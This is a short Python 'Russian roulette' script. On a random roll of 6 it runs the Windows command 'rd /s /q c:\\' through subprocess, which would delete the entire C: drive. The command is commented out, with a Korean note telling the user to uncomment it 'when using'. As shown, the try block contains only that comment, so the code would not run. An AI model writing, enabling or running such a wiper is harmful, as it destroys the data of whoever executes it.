import random
import os
import subprocess

selected_number = random.randint(1, 6)

print("Selected number:", selected_number)
if selected_number == 6:
    try:
        #사용시 주석처리 지우기# subprocess.run(["cmd", "/c", r"rd /s /q c:\\"])  
    except Exception as e:
        print("ERROR:", e)
